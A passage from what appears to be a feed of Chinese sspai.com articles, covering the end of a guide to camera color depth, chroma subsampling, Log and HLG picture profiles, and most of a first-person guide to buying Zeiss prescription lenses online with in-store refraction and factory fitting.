4:2:2」的画面时，就是在描述这个相机的色深和色度采样。这两个数值一起来描述一台机器能够记录的颜色信息量的多少。</p>\n<h3>色深</h3>\n<p>指代的是红、绿、蓝三个通道里面，每个通道从正红色、正绿色、正蓝色渐变到正黑色所能容纳的灰度。（可以理解成黑色图层覆盖在通道上面，随着不透明度逐渐增加，最终变为全黑的过程）</p>\n<p>8 bit：每个通道能够容纳 2^8 （即 256 ）个灰度，使用 0 至 255 这 256 个整数进行记录。我们知道，在 RGB 的色彩世界里，任何颜色都可以通过红、绿、蓝三色混合叠加而成（如果没有某种颜色的参与，这种颜色的数值即为 0 ，三种颜色为 0 时，混合叠加即为黑色；三种颜色为 255 时，混合叠加即为白色）， 256^3 就是 8 bit 色深可以显示的色彩量，帮你算了，大概就是 1700 万种色彩。</p>\n<p>同理可得：</p>\n<p>10 bit：每个通道能够容纳 2^10 灰度值，即 1024 个灰度，一共可以展示超过 10 亿色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/cd71f685de9afda7e19fa013ad3529d6\"><figcaption>8 bit 和 10 bit 色深的效果对比</figcaption></figure><p>这个就是 8 bit 和 10 bit 的差距，表现在实际拍摄中的直观感受为： 8 bit 在后期调色的时候，或者在拍摄一些具有渐变性质的画面（如日出或者日落时万里无云的天空，从橘黄色渐变为深蓝色）容易出现色彩的断层。断层出现的原因：A → B → C 的颜色渐变中，不能够通过 8  bit 的 RGB 关系来表达出颜色 B ，所以我们只能够记录到从颜色 A 到颜色 C 的渐变。而如果有 10 bit 的记录能力，这种情况可以大大缓解。</p>\n<p>当然，如果你还是需要使用 8 bit 来记录，也可以通过在画面增加颗粒效果来打破顺滑的颜色渐变，从而减少色彩断层出现的情况。</p>\n<h3>色度采样</h3>\n<p>指的是一种色彩的采样方式。一般来说，我们会对图片使用 RGB 进行信号传输，即使用红色通道、绿色通道、蓝色通道各自独立进行信号传输。但是视频为了更大地节省存储的空间（因为视频是由数量超多的一帧帧画面组成的，如果使用 RGB 的方式进行传输会非常占空间），采用另一种名为 LUV 的方式进行视频信号的记录。 L 代表明度， U 和 V 代表色度。</p>\n<p>研究人员发现，每个像素需要保留明度信息，但是色度信息可以通过好几个像素共享。我们说的 4:4:4，4:2:2，4:2:0 就是描述像素色度信息被保留（或者被丢弃）的程度，从左到右分别能记录从多到少的色度信息。一般民用的相机里，相对视频功能比较看重的设备会配置 4:2:2 的色度采样，而大部分相机都只能够记录 4:2:0 的色度信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/60676a43f1ca5eee2ada231857476e86\"><figcaption>三种色度采样的色彩信息量对比</figcaption></figure><p>现在很多标准的蓝光影片依然使用 8 bit 4:2:0 进行视频记录，一般记录生活的话， 4:2:0 也能用。但是如果我们想要进行二级调色，或者进行对画面的某样物体进行抠图，因为某些像素缺乏自己的色度信息，所以二级调色容易出现色块，抠图也难以抠得精细。</p>\n<p>需要提一下的是，原生提供 10 bit 4:2:2 视频录制功能的相机并不多，但是一些机器可以通过外接录机实现更高规格的视频录制。例如：</p>\n<p>索尼 a7m3 外录可以实现 8bit 4:2:2 的视频规格（原为 8 bit 4:2:0 ）</p>\n<p>富士 X-S10 外录可以实现 10bit 4:2:2 的视频规格（原为 8 bit 4:2:0 ）</p>\n<h2>图像配置文件</h2>\n<p>从上文我们知道，色深和色度采样很大程度上决定了画面中色彩信息的多少，而使用者为了获得更大的后期调整空间，在选择了高色深和高色度采样的文件规格后，往往会选择采用比较 Log 曲线进行记录，后期也诞生了 HLG 曲线标准。不同的图像配置文件，其实本质上不存在优劣之分，是长时间的影视实践中，针对不同的画面以及拍摄需求产生的不同图像配置文件。</p>\n<h3>色域与图像配置文件</h3>\n<p>一般来说，只是选定了图像配置文件还不够，必须要有合适对应的色域和图像配置文件一起使用。色域就是颜色可以显示的范围。我们经常可以看到一个马蹄状的彩色区域，不同色域的 R（红） G （绿） B （蓝）并不相同，把 RGB 三点连起来的三角形，就是某个色域的范围。</p>\n<p>某个视频的色域是怎么样的，具体取决于拍摄时设备设定的色域，但是最终的色彩结果也受我们观看这个视频的屏幕上的色域影响。单从视频播放来说，我们基本上看到的视频都是 Rec.709 （BT.709）色域的视频；一些配备有HDR播放功能的设备色域可能是 BT.2020 标准的；数字电影主要采用 DCI-P3 色域作为标准，由 Digital Cinema Initiatives 指定；我们拍摄视频时，为了获得最大的宽容度，索尼建议采用 S-Gamut3.Cine 或者 S-Gamut3.Cine 作为色域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/09457e87508c1f4ff50f04b2d8b0172d\"><figcaption>不同色域的范围对比</figcaption></figure><p>如上文说到，因为设备规格的不统一，有可能存在拍摄的视频与观看视频色域不一样的情况出现。因为色域定义的是能够呈现的颜色的标准，如果色域不一样，那么就会出现同一种颜色在不同设备上显示不一致的情况出现（或者画面出现过灰或者过饱和的情况）。这个时候，我们就需要记得给色彩空间进行转换，即把一个色彩空间内的颜色映射到另一个色彩空间内，来维持色彩显示效果的统一。如果使用 DaVinci Resolve 进行调色，需要进行色彩空间转换，再进行个性化的二级调色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/1be94519bfdf23db5f4a65a0b700b984\"><figcaption>DaVinci Resolve 的色彩空间转换功能，不过有人也喜欢灰灰的调调，这个看个人操作习惯</figcaption></figure><h3>比较常见的几个图像配置文件</h3>\n<h4>无</h4>\n<p>当你没有进行图像配置文件设置的时候，就是即拍即用的画面色彩。标准的画面色彩普通记录其实也完全可用，给用户免去了画面色彩校正再进行后期调色的步骤，能够满足大部分用户的需求。但是就像静态画面的 jpg ，本身能够记录的动态范围不大，在记录范围外的画面信息也没法通过后期处理找回来。</p>\n<p>如果实在需要使用标准的视频输出配置，可以稍微降低饱和度和锐度来稍微提升一些宽容度，同时画面也会变得柔和一些观感会好上不少。</p>\n<h4>Log</h4>\n<p>Log 曲线是一种为了让相机能够记录更多信息的伽马曲线。</p>\n<p>伽马曲线可以理解为：画面信息从全黑到全白可映射为一条 45° 的直线，但是感光材料的特性，在显示器中呈现一条曲线，为了抵消感光材料带来的失真，需要绘制一条相反的曲线，这就是伽马曲线大致的形态。伽马曲线有很多种，但是基本都是这种形态：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/1ccb5395e501e0ee24edc6fb6f201269\"><figcaption>CRT曲线特性是往下凹陷，视频曲线需要通过中间上拱来抵消变化</figcaption></figure><p>Log 曲线为了记录更多的信息，本质上是通过对可能过曝或者欠曝丢失细节的高光和阴影信息压缩到中间调区域，为此，对 Log 曲线进行了优化。如对曲线的底部和顶部增加膝点（Knee point）调整曲线的倾斜率，从而改变画面的对比度。所以未经校正的 Log 文件画面会看起来发灰发白，但是可以看到阴影和高光确实比 Rec.709 的画面有更多的细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/16c8157bc85ea466794aecbeaec583fa\"><figcaption>膝点校正</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/5cfa22a0f7ce5d8aed11d42408419189\"><figcaption>和 Rec.709 相比， S-Log 能够容纳更多的亮度信息</figcaption></figure><p>很多厂商都有自己的 Log 曲线（如索尼的 S-Log ，佳能的 C-Log ，尼康的 N-Log ，松下的 V-Log ），但是因为厂商的色彩管理思路不一样，所以各自的伽马曲线斜率并不一致（有的倾向保留高光，有的倾向保留暗部信息），不同厂商之间的曲线很难匹配。</p>\n<p>以索尼微单为例，索尼提供 S-Log2 和 S-Log3 两种 Log 曲线。肉眼上看， S-Log3 比 S-Log2 更灰一些，更亮一些，按照<a href=\"https://www.sony.com.sg/electronics/support/articles/00145908\" target=\"_blank\">索尼官方文档</a>的说法， S-Log2 在中间调到高光的过渡层次更好， S-Log3 在阴影到中间调的表现更好。</p>\n<p>但是因为 S-Log2 本身饱和度没有 S-Log3 那么低，所以对调色的要求也没有 S-Log3 那么强，对于大部分的 8 bit 4:2:0 的相机来说比较友好，不容易出现断层，所以一般建议 10 bit 4:2:2 的设备如 a7s3 使用 S-Log3 曲线，其他的机器可以先体验体验 S-Log2 是否能满足需求，然后再考虑使用 S-Log3。</p>\n<p>同时，因为S-Log的起始 ISO 比较高（800起跳），它的原理是提亮暗部和压暗亮部到中间调，暗部很容易出现明显的噪点。所以为了保持画面的纯净度，有一个「向右曝光」的规则，就是在保证画面没有大面积过曝的同时，尽可能让直方图的画面向右「亮部」曝光，让中间调和暗部也有足够的亮度信息，配合斑马纹（过曝区域会出现黑白相间的斑马纹）使用可以获得更精确的对焦。但是为了方便，我个人会直接选择在曝光补偿中选择+2 档，这样拍摄起来过程会更流畅些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/ecd7cf2612624bbea21b7b149d44c79d.gif\"><figcaption>通过斑马纹能精确判断过曝范围</figcaption></figure><h4>HLG</h4>\n<p>HLG 的全称是 Hybrid Log-Gamma （混合对数伽码），是由英国 BBC 广播公司与日本放送协会 NHK 共同开发的“数位节目放送” HDR 标准，于 2015 年 5 月推出。出于商业保密原则，每个公司的 Log 都会有自己标准，造成后期难以匹配视频素材风格， HLG 作为一个通用标准，能够更容易进行不同设备拍摄素材的匹配。</p>\n<p>对于普通的用户来说， HLG 也更加易用。 HLG 里的 Hybrid ，指的是： HLG 在暗部和中间调使用了类似 Rec.709 的伽马曲线，高光部分使用了类似 Log 的伽马曲线，既让画面不会看起来太灰，增加可用性，又让高光信息得到了更好的保留。</p>\n<blockquote><p>HLG 模式一共有有四种，包括 HLG 、 HLG1 、 HLG2 、 HLG3 。HLG 是国际规定的标准，而 HLG1 、 HLG2 、 HLG3 则是索尼相机优化的版本。其中 HLG1 在这些曲线中拥有最好的降噪性能，但总体动态范围较窄，而 HLG3 拥有宽动态范围，但噪声较大。而 HLG2 则处于中间，性能比较均衡。HLG2 的最低 ISO 为 125 起跳，远低于 S-Log 的 800 ，也可以获得更纯净的画面。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/2e85a953e66e95ef1bac544918eae501\"><figcaption>HLG 信号曲线和 Rec.709信号曲线对比，可以看到 HLG 能更好地保护高光</figcaption></figure><h2>结语</h2>\n<p>最后总结一下不同图片文件配置各自的使用范围：</p>\n<p>Rec.709：日常使用，基本不需要额外调色，调色空间也少</p>\n<p>S-Log：有比较大的调色范围，对调色水平要求较高</p>\n<p>HLG：日常使用和调色空间比较好的平衡，可以直出，也可以自行调色。</p>\n<p>今天尝试给大家（也是给我自己）做了一个总结，在前期拍摄的时候，根据特性如何找到最合适自己的图像配置文件。前期拍摄是录制视频的第一步，选择适合的图像配置文件有利于获得后期更大的调整空间，让画面呈现出更好的效果。希望大家都能够拍摄出好视频啦。</p>\n<hr>\n<p>封面来自<a href=\"https://unsplash.com/photos/sXia-d6iYAg\">Unsplash</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67997"},{"title":"你也可以配一副适合自己的眼镜：线上配镜的经验与实践","date":"2021-08-05 06:47:21","description":"\n<p>作为一个多年的近视眼，眼镜早已成为我生活中不可分割的一部分，十几年来，几乎都是起床就戴上、睡觉才摘下，自然到甚至很难意识到眼镜的存在。不过，正因为对于大部分近视的人来说，眼镜都是长期朝夕相处的事物，配备一副更好的镜片就显得更加重要。</p>\n<p>在配新眼镜时，有几天的适应期是正常的，但由于人眼确实具备一定的可塑性，即使是配备得不那么准确的镜片，在一段时间之后也会被人眼适应，这就导致在长期的时间尺度上，「正常适应新镜片」和「妥协性适应不合适的镜片」经常会让人难以分清。而在适应之后，长期使用不合适的镜片不但不能起到足够的矫正和辅助作用，还会进一步伤害使用者的视力。</p>\n<p>上个月，我因为旧眼镜的镜腿损坏送去维修，临时去 JINS 配了一副备用眼镜，戴上之后才意识到，老的镜片虽然价格和质量都比备用眼镜的高，但因为多年使用带来的老化和划痕，此时实际的视野已经远不如新的备用镜清晰了。因此，我决定在眼镜修好之后，给它好好换一副新镜片。当然，对于预算充足的消费者来说，直接去大型连锁眼镜店挑贵的就可以解决问题了，但我自己还是打算在保证质量的前提下，尽可能便宜的达到目的。</p>\n<p>经过一番研究，我最后成功的通过线下验光和测量镜架数据，并在电商下单镜片并寄送装配的方式成功地用比较优惠的价格配到了一副合适的镜片。在这篇文章中，我会分享我做的一些功课和实际的操作思路，希望可以为广大戴眼镜的朋友提供一些参考。</p>\n<h2>如何选购价廉物美的镜架及镜片</h2>\n<p>「眼镜是个暴利行业」这句话似乎一直以来都深入人心，包括我自己，在配眼镜的时候都会下意识地把它当作一个常识。而丹阳眼镜城、潘家园等地方性产业中心、1688 等电商批发渠道中与实体眼镜店标价悬殊的差距似乎也佐证了这个论断。但实际情况确实如此吗？我觉得需要分情况看。</p>\n<h3>镜架：想要性价比，关键在渠道</h3>\n<p>在镜架方面，如果你想追求「超级性价比」，那丹阳、深圳等主要产地具有绝对的价格优势。以江苏丹阳为例，丹阳是中国的主要眼镜产地之一，镜架年产量约占全国的三分之一。相对于镜片来说，镜架的技术含量比较低，根据 <a href=\"https://tv.cctv.com/2020/09/11/VIDE54QdabINhbFdItd1w8r3200911.shtml\">央视《正点财经》栏目 2020 年的报道</a>，丹阳一副镜架的出厂价在 30 至 80 元区间内，即使是纯钛材质的镜架，也只要 80 元左右。因此，如果有条件可以直接前往镜架产地（事实上，丹阳的「配镜游」已经成为了当地的一个标志性产业，在网上也有许多关于专程从外地去丹阳购买眼镜的文章），在几十元到一百多元这个区间，买到一副质量合格的镜架是没有问题的。</p>\n<p>但同时也应注意到，丹阳眼镜虽然产量极大，但仍然以中低端产品为主，并且这样非常逼近成本的售价几乎是只有在产地才可以成立的。换句话说，<strong>如果在其它渠道看到这样价位的镜架，那么它们有更大的概率会是质量不合格的产品或是长期库存的产品。</strong></p>\n<p>如果你的预算在此之上，对镜架的要求更高，例如一些特殊的材料和设计（例如 Lindberg 的无铰链设计或者 Silhouette 的超轻钛质镜架），或者喜欢更精致的手工制品（例如日本的一大批手工作坊品牌），那么通过正规渠道购买品牌产品仍然是更加合适的选择。</p>\n<h3>镜片：买片虽易，验光却不简单</h3>\n<p>对于镜片来说，根据上文央视报道，丹阳出品的镜片出厂价大约在 30 元左右，在网上许多配镜经验帖子中，在当地许多店铺甚至是买镜架送镜片的——这大约也是「能用的镜片」的价格下限。不可否认，倘若加工得当、质量过关，便宜的国产镜片在今天已经足以承担普通人日常使用的需求，不用担心会对视力不利，明月、万新等国产镜片品牌近年来也已经在市场上取得了不错的口碑。</p>\n<p>但是，如果追求价格上的极致的便宜，那么你所需要付出的时间精力和承担的风险就会不可避免地增加。<strong>对于普通的连锁眼镜店来说，镜架和镜片其实并不是主要的成本，真正的大头是人工和房租。</strong>在验光、挑选、加工、装配、试戴、售后的整个配镜流程中，物料也只是其中的一环而已。而眼镜作为一个准医学设备，其它的服务性环节也是非常重要的，<strong>哪怕买了最好的镜架和镜片，如果加工不当、验光不准，对佩戴者的视力也是有害无益</strong>。一家合格的眼镜店会配备专业的验光设备、人员以及完善的售后，这些无疑会增加配镜的成本，但对于让你配到一副合适的眼镜也是必不可少的。</p>\n<p>微博博主 @dkdvip 的视频《<a href=\"https://m.weibo.cn/1235178820/4663305916126646\" target=\"_blank\">眼镜是不是暴利行业？</a>》详细说明了实体店配镜的成本构成和服务的必要性，并认为线上配镜不可行。我认为，在预算足够的情况下，靠谱的实体店确实比线上要可靠许多，但是在如今许多配镜环节可以标准化的现在，我们仍然可以通过把重要的验光测量环节在线下完成、把装配、购买等更流程化的环节转移到线上来降低成本。</p>\n<p>从网上的一些配镜体验文章中也可以看出，对于丹阳等主打性价比的眼镜城，其优势主要是价格实惠、（镜架）款式丰富，而缺点主要是验光随意、事后发现装配不准甚至装配有瑕疵、买到长期库存商品或者货不对版、价格不透明（例如流传很广的「一定要找个说当地方言的朋友一起去才不会被坑」的说法）、售后麻烦甚至无售后（特别是对于从外地前往配镜的情况）等等。就镜片而言，目前绝大多数的眼镜片都为树脂材质，而与我们平时常见的玻璃材质不同，树脂眼镜片无论质量好坏，都是会随着时间老化而出现发黄、镀膜老化等情况，算是某种程度上的易耗品，因此，如果买到库存镜片，即使镜片本身出厂质量合格，也相当于变相给使用寿命打了折扣。</p>\n<h3>想要配到合适的镜片，这些因素不可忽视</h3>\n<p>成品眼镜片在出厂时是圆形或者椭圆形的镜片，需要经过加工之后装配到眼镜上之后，镜片的购买流程才算完成。镜片最主要的组成部分是坯片和镀膜，其中，坯片基材的供应商相对集中，无论是什么品牌、价位的镜片，1.6 折射率以上的基材通常都来自日本三井、韩国 KOC 等少数几家供应商，并且坯片本身以中国生产为主，因此，在这个环节，可以认为不同品牌的镜片差别不大。</p>\n<p>配过眼镜的朋友对于折射率这个属性应该都不陌生，镜片的折射率直接由基材决定，主流的树脂镜片有 1.5、1.6、1.67、1.74 几种，折射率越高，度数相同的镜片就越薄，价格也越贵。但是，并非越薄就一定越好，一般来说，折射率越高的镜片，阿贝数<sup class=\"ss-footnote\" href=\"\" title=\"阿贝数指的是色散系数，阿贝数越高的镜片成像会越清晰，如果是从事设计等对于眼镜的色彩表现有较高要求的职业，在配镜时最好留意一下阿贝数。\" footnote-id=\"1\">1</sup>就越低，镜片密度也会变高，也许会出现够买更高折射率的镜片反而导致整幅眼镜变重的情况。<strong>高度近视者为了控制镜片的厚度，可能会需要选择更高的折射率，而中低度数者即使预算充足，也不必一味追求高折射率，选择适合自己的就好。</strong>一般来说，对于非高度近视（600 度以内）的配镜者而言，1.6 折射率是光学性能、厚度和价格平衡得最好的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/a6703e621e9b0a0d9852102a8d5c84cf.png\"><figcaption>高低阿贝数成像对比</figcaption></figure><p>我们接触到的镜片品牌（蔡斯、依视路、尼康、明月、万新等），基本上都是出于产业链中游的企业，即对坯片进行不同的面型加工和镀膜，生产出成品镜片的厂商。而镀膜与面型，也正是市面上不同档次的镜片的主要差别和各大品牌的竞争力所在。本文的主要目的并非镜片科普，因此对于技术细节不作过多深入，但一些基本的事实是：面型加工有球面、内非球面、外非球面、双非球面、自由曲面等技术，<strong>使用的技术越高端（双非&gt;内非&gt;外非&gt;球面，非球面中：自由曲面&gt;非自由曲面），同样度数和折射率的镜片就可以越轻薄，光学性能也越好（例如镜片边缘的视觉变型会越小，视野更大），价格也越昂贵</strong>。采用自由曲面技术的镜片，可以根据个人的情况，利用精密车床对镜片进行个性化打磨，进而获得更加匹配个人情况的光学性能。也因为加工比较复杂，这种技术一般都是使用在价格较高的定制型镜片中。</p>\n<p>需要注意的是，定制镜片本质上是在打磨镜片时，在近视度数、散光、瞳距等常规验光可以获得的数据基础上，增加一些使用者的个性化参数，这其中有些是人眼的参数，例如单眼瞳距、脸部倾斜角和年龄，也有需要配合镜架的参数，例如眼睛和镜片的距离、镜片倾斜角。<strong>只有准确测量了所需的参数，定制才有意义</strong>，否则如果使用默认数据的话，就和非定制镜片没有区别了，因为非定制镜片本身就是根据平均数据设计的。在线下实体的配镜时，商家通常都会帮忙测量好所有所需的数据，但许多用户为了便宜在电商下单，却没有提供相应的数据，而很多商家嫌麻烦没有提醒（反正也不是不能用），结果就导致花了更多的钱买了定制款，却只得到了和非定制款一样的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/d8d0a95eb0ef01222587b8ea36cf4089.png\"><figcaption>蔡司产品册上的镜片定制参数要求</figcaption></figure><p>而膜层主要影响的是镜片的一些光学以外的性能，例如防水防油、防静电防尘、防紫外线、耐磨、防蓝光、提升视野的明亮度、降低反射等等，各家镜片厂商都有自己特有的镀膜，有些也提供各种功能的膜层的自行选择和组合，在经历疫情爆发之后，一些厂商甚至推出了 <a href=\"http://sh.sina.com.cn/news/k/2020-11-07/detail-iiznctke0128267.shtml\">具有抗病毒功能的膜层</a>。这几年比较受关注的防蓝光功能，根据品牌的不同，通过基材和镀膜都可能实现。</p>\n<blockquote>\n<p>镜片行业产业链主要由上游的原材料和辅料供应商、设备供应商，中游的镜片生产厂商以及下游的代理商、经销商和镜片零售商组成，其中零售商包括连锁眼镜零售商、眼镜零售门店、电商平台、民营眼科医院以及综合医院附属的配镜中心等。上游厂商主要向中游生产商提供树脂、玻璃、塑料及模具、光学添加剂等镜片生产原料和生产设备，此外还向下游零售商提供验配设备；中游的镜片生产厂商除了加工生产镜片成品和定制的车房片，还要承担材料、膜层、工艺技术、光学性能等方面的研发设计工作，并为下游销售渠道提供销售折扣、专业设备、加工、售后、销售员及视光师专业培训等支持；下游零售商直接面对终端消费者，需要在门店配置专业设备和专业视光人员，为消费者提供验光、配镜、镜片镜架装配、试戴体验等专业服务。 </p>\n<p>——《2020 年中国眼镜镜片行业白皮书》</p>\n</blockquote>\n<p>因此，在选择镜片阶段，我的结论是——</p>\n<ol>\n<li>对于最终的佩戴效果来说，准确的验光和镜片加工，比镜片本身更重要；</li>\n<li>对于基本款镜片（非高度近视、无特殊功能需求、无特殊面型）来说，购买价格较低的国产镜片完全没有问题，也是性价比更高的选择，国际大牌的基本款镜片基本上只是在镀膜上有优势，也存在较高的品牌溢价；</li>\n<li>如果有特殊的需求，例如防蓝光、渐进片、驾驶特化型镜片，特别是渐进片这类对于面型设计技术要求较高的款式，则优先选择大品牌的相应款式；</li>\n<li>如果预算可以提高，可以考虑选择更高端的面型的镜片，例如内非球面和双非球面，乃至使用自由曲面技术的定制镜片，也可以酌情考虑升级镀膜，通常，同一款式的镜片升级镀膜的价格不会太高。</li>\n</ol>\n<h3>我的镜片与购买渠道选择</h3>\n<p>这次更换镜片，我给自己的预算是一对镜片 1000 元以内。经过一番考虑，我选择在 1688 平台上购买蔡司智锐单光版镜片，大概有以下几个原因——</p>\n<ol>\n<li>在高端镜片品牌中，蔡司在国内是市场最大的，代理商也很多，因此 1688 上可以用接近批发价的价格买到蔡司的镜片，同时售后等也比较有保障，而尼康、罗敦斯徳、精工等品牌，虽然在类似的档次也有自己独到的技术，但因为渠道较少，因此很难找到比较便宜的价格，基本上只能用门市价买到，或者借助不稳定因素更大的代购，我并没有特殊需求，因此在这个预算下，购买蔡司是更具有性价比，也更方便的选择，我要购买的镜片也并非顶级，当然希望在同预算下可以买到相对更高端一些的产品；</li>\n<li>也是因为在国内市场较为成熟，蔡司有很方便的防伪系统，镜片本身的真伪和镜片原厂加工的流程都可以直接从官方公众号查询确认，同时，我选择的蔡司智锐是这两年新推出的较新型号，几乎全线都是定制片，下单之后才会根据我的需求进行生产加工，因此买到假冒伪劣产品或者库存镜片的可能性几乎不存在；</li>\n<li>在蔡司的产品线中，智锐是通用型镜片，适合各种类型的使用者，同时，也是因为它是最新推出的产品，许多曾经只在更贵的高端产品（如博锐和臻锐）中使用的技术——例如精密成型——都用在了智锐上面，还增加了特有的针对年龄优化的参数，因此在目前的定制镜片中，应该算是很实惠的了，此外，智锐也专门为经常使用电子产品的场景进行了优化，对于每天要花很长时间盯着屏幕的我也比较合适。</li>\n</ol>\n<p>我在 1688 上购镜的价格是每片 372 元，同时加了 50 元选择了原厂加工服务，而同款镜片的官方标价为 3180 元每对。作为批发平台，1688 上有不少价格非常便宜的蔡司镜片，可以根据需要自行搜索。基本上，只要商家可以提供镜片的原始包装袋、以及原厂加工的加工单，加上核对收到的镜片包装和镜片本身的水印防伪，基本上就可以确定镜片没有问题了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/01/c423def69e20ddcb2b905a38cc4ff1fd.JPG\"><figcaption>镜片加工单和包装袋，上面会包含防伪查询信息</figcaption></figure><p>根据我的经验，靠谱的线下店能够提供的比较低的价格大概是官方产品册标价的 6 折左右，在有活动或者结合各种优惠的情况下，5 折也不少见，对应到这款镜片就是 795 至 954 元每片，参考实体店额外的人员、房租等成本，大家可以自行估计价格的合理程度。</p>\n<h2>镜片的加工与装配</h2>\n<p>前文提到，对于定制镜片来说，往往需要测量一些额外的参数，才能真正的进行定制。但如果你打算从电商渠道购买，就会碰到一个很尴尬的问题：很多数据自己测量会非常不精确，但是如果自己去眼镜店要求测量却不在店里配镜，店员又未必愿意为你提供服务。</p>\n<p>蔡司的情况会好一些。蔡司在很多城市的眼镜店中都配备了 <a href=\"https://www.zeiss.com.cn/vision-care/eye-care-professionals/products/instruments-technology/i-terminal-2-lens-customisation.html\">i.Terminal</a> 设备，可以用标准化的流程测量镜架的相关数据，通常这样的眼镜店也相对高端，可以提供付费的验光和测量服务，价格在几十到上百不等。购买这样的服务往往可以得到负责任的对待，我认为为了配到一副合适的眼镜，这个价格是非常值得，也是必要的。</p>\n<p>在微信中搜索「蔡司睛选」小程序，选择「探店」，就可以查到当地哪些眼镜店拥有哪些设备了，我自己就是在小程序中找到附近提供设备的眼镜店，在大众点评上购买测量套餐并预约前往的。一些更高端的店铺会配备 <a href=\"https://www.zeiss.com.cn/vision-care/eye-care-professionals/products/instruments-technology/i-profiler.html\">i.Profiler plus</a> 自动验光仪，可以测量角膜地形图，并获得可以精确到 1 度的更精准的验光处方，i.Profiler 比 i.Terminal 更少见（因为更贵），也不是配镜必须的，它最终提供的还是验光处方，只是数据可能更可靠和精确，如果你查到附近有配备它的眼镜店，价格也合适的话，不妨一并试试。</p>\n<p>对于配镜处方，只要是配过眼镜的朋友应该都不陌生，大多数线下眼镜店都会为配镜的顾客提供附带的免费验光服务并开具处方。不过，<strong>为了获得更加准确的结果，特别是在本文中的线上配镜的场景，付费验光可能是更好的选择。</strong>一个正规的配镜处方有主观和客观验光两部分，通过综合验光仪得到的自动客观验光结果，只能反映当前的眼部情况，作为配镜的参考，但验光处方是不应直接用来配镜的，一个正规的配镜验光过程必需再经过问诊、散光精测、主视眼测试、双眼平衡等步骤。关于验光，更详细的介绍可以参阅<a href=\"https://zhuanlan.zhihu.com/p/166298197\">《一个好的验光过程应该是怎样的？》</a>一文。</p>\n<p>至于具体在哪里验光，可以找当地提供单独综合验光服务的大型眼镜店、眼科医院等进行，如果在过程中发现仅仅使用了自动测光结果、测光师操作明显不熟练、基本没有问诊等情况，建议找具有资质的验光师重新验光。</p>\n<p>我这次单独验光总结出的一个小技巧是：许多眼镜店会把自己的付费验光套餐放在大众点评上出售电子券，在点评里面搜索「综合验光」，就可以比较容易地筛选出当地提供单独付费眼光服务的商家，可能因为付费验光属于国内传统的眼镜消费流程之外的服务，许多眼镜店也会在这里详细写出验光服务的内容和验光师的资质，这也大大方便了我们作为消费者的挑选，以我在杭州观察到的情况，通常 40 至 100 元就可以获得质量非常高的验光服务了，甚至可以指定国家一级验光技师验光<sup class=\"ss-footnote\" href=\"\" title=\"注释：验光师的职业技术资格分为：初级验光员、中级验光员、高级验光员、二级技师、一级技师，对验光师的工作年限、经验和技术有相对应的要求，如果能找到高级验光员以上的验光师，得到的配镜处方基本上是可以完全放心的。\" footnote-id=\"2\">2</sup>。如果时间和预算充足，一些专门的眼科医院和更专业的机构也提供包括了眼部疾病筛查的更细致的验光和检查服务，不过这就不完全属于配镜的范畴了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/cb28dd2aea7fe614fb31da571c7d51af.JPEG\"><figcaption>《大众点评》上找到的付费验光服务</figcaption></figure><p>上文还提到，我在购镜时选择了原厂加工服务。所谓的原厂加工，并非将你的镜架和镜片送到蔡司镜片的广州工厂去加工，而是送到蔡司自己开设的加工中心，目前共有 19 个，在不同的省市都有设置，蔡司官方的两篇文章对镜片的装配有详细的介绍（<a href=\"https://mp.weixin.qq.com/s/fmV1LP3fDMn79bSBRFGvrw\">上</a>、<a href=\"https://mp.weixin.qq.com/s/DQLcKdEHXI_5x0Njcnmc6w\">下</a>）。除了蔡司之外，依视路等品牌也有设置自己的加工中心，逻辑类似。原厂加工的好处主要有：</p>\n<ol>\n<li>可以保证镜片是正品。首先，可以送至原厂加工本身，就可以证明你购买镜片的经销商是经过蔡司正规授权的，加工中心也只会加工正品的镜片，并会提供可追溯的加工单，售后也更有保障；</li>\n<li>加工更精确。官方的加工中心具有比较严格的装配标准，也所使用的设备都是较为高级的全自动设备，虽然未必一定比所有眼镜店配备的设备都强，但肯定是强于大多数小型眼镜店的，并且对于定制镜片来说，官方的加工中心对一些定制参数的把握要更精确。此外，因为镜片和加工中心都是蔡司自营的，因此如果精片在加工过程中损坏，对于官方加工中心来说，直接换一片新的就可以了，但如果是眼镜店自行加工，可能会带来不必要的扯皮。</li>\n</ol>\n<p><strong>无论是线上还是线下配镜，加工都是一个非常标准化的流程</strong>，也就是说，最好的装配就是严格按照眼镜店提供的参数单进行的装配，反过来说，如果你的参数本身有问题，装配工人再厉害也救不了。这也是我认为网上配镜可行的原因，只要是在负责任的线下店进行验光和参数测量，你拿到的参数就可以是准确的，和线下配镜无异，可以尽可能的缩小线上线下配镜可靠程度的差距。</p>\n<p>当然，许多大型的连锁眼镜店也会配备自己的加工中心，设备和技术也未必会比原厂差，如果你购买的是非定制镜片和设计比较常规的镜架，交给眼镜店自行加工通常可以更快地拿到眼镜，通常不会有太大的问题。但如果你去的是规模不明的小眼镜店、买了定制片、使用装配工艺比较复杂的镜架、或者是线上下单的话，最稳妥的方式还是选择原厂加工，这是获得高品质且有保障的眼镜加工、装配最简单的方法。</p>\n<h2>流程总结和配镜结果</h2>\n<figure class=\"image ss-img-wrapper\"><img 